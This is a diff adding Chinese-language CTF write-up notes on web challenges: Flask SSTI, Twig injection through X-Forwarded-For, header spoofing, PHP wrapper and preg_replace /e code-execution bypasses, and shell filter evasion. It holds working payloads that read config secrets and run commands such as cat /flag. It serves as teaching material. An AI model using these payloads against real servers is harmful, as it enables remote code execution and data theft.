@@ -207,6 +207,130 @@ Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOnsiYWRtaW4iOnRydWUsIm
 注意这里的token有所不同，因为重新开环境了
 需要访问/home 才能返回flag
 
+## 1.9 SSTI(服务器模板注入)
+- Simple_SSTI_1
+参考：https://www.adminxe.com/2022.html
+进入环境，提示：You need pass in a parameter named flag。 需要传递一个名为flag的参数，那么参数值呢？
+查看页面源代码：
+<!-- You know, in the flask, We often set a secret_key variable.-->
+构造payload：?flag={{ config.SECRET_KEY}}拿到flag
+
+- Simple_SSTI_2
+参考：https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X00-%E5%89%8D%E8%A8%80%EF%BC%9A
+https://winny.work/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/358.html
+和上题一样SSTI，不过没有提示引擎，先查看报错得到引擎，payload：?flag={{1}
+![alt text](image-17.png)
+引擎是python的flask模板
+构造payload：?flag={{ config.__class__.__init__.__globals__['os'].popen('ls ../').read() }}
+![alt text](image-18.png)
+payload:?flag={{ config.__class__.__init__.__globals__['os'].popen('ls ').read() }}
+![alt text](image-19.png)
+查看flag:?flag={{ config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read() }}
+
+## 1.10 修改源代码
+- bugku 计算器
+进入环境，结果应该是98，两位数，但输入框只能接受一位数
+![alt text](image-22.png)
+F12查看器，修改最大长度为2
+![alt text](image-23.png)
+输入98获得flag
+
+## 1.11 xxf伪造ip
+burpsuite抓包添加：
+```
+X-Forwarded-For: 127.0.0.1
+```
+php可能存在Twig模板注入，此时xxf会被当做代码执行，如：
+```
+X-Forwarded-For: {{system('ls')}}
+X-Forwarded-For: {{system('ls /')}}
+X-Forwarded-For: {{system('cat /flag')}}
+```
+## 1.12 修改Referer
+- bugku 你从哪里来
+进入环境，页面提示：are you from google?
+说明需要从google跳转来，burpsuite抓包，放行得到flag
+![alt text](image-24.png)
+- 修改Referer可以和xxf，User-Agent结合
+$\color{FF0000}{注意，不要放在消息头的末尾，插在消息头中间}$
+```
+X-Forwarded-For: 127.0.0.1
+Referer:http://127.0.0.1
+User-Agent: Syclover
+```
+
+## file_get_contents绕过，preg_match绕过
+- [BJDCTF2020]ZJCTF，不过如此
+```php
+ <?php
+error_reporting(0);
+$text = $_GET["text"];
+$file = $_GET["file"];
+if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        die("Not now!");
+    }
+
+    include($file);  //next.php
+    
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+text参数要包含"I have a dream"，绕过方法有：
+- 1.使用php://input伪协议绕过
+将要GET的参数?xxx=php://input
+用post方法传入想要file_get_contents()函数返回的值
+- 2.data://伪协议绕过
+将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码
+或者将url改为：?xxx=data:text/plain,(url编码的内容)
+
+用data://绕过，file不能含有flag，使用php://filter 绕过，用base64输出就不会匹配到了payload:
+```
+?text=data://text/plain,I have a dream&file=php://filter/read/convert.base64-encode/resource=next.php
+```
+得到base64字符串，解码：
+```php
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+
+```
+这里的PHP版本是：5.6.40，preg_replace()+/e存在代码执行漏洞
+PHP正则表达式的逆向引用与子模式分析：https://blog.csdn.net/qq_20408491/article/details/75095055
+```
+/?text=data://text/pain,I have a dream&file=next.php&\S*=${phpinfo()}
+```
+![alt text](image-49.png)
+```
+/?text=data://text/pain,I have a dream&file=next.php&\S*=${getFlag()}&cmd=system('cat /flag');
+注意末尾的';'号
+```
+![alt text](image-50.png)
+
+## cat绕过，空格绕过
+cat使用tac
+空格使用$IFS$9
 
 # 2.sql注入
 ## 2.1 万能账户密码
